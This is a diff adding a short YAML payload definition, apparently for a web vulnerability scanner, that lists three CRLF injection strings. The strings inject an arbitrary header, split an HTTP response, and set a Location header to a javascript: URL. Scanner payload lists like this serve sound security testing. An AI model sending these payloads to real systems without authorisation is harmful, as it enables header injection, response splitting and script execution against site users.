@@ -1,0 +1,7 @@
+name: "CRLF Injection"
+type: "crlf"
+severity: "medium"
+payloads:
+  - "%0d%0aInjected-Header: value"
+  - "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK"
+  - "%0d%0aLocation: javascript:alert(1)"
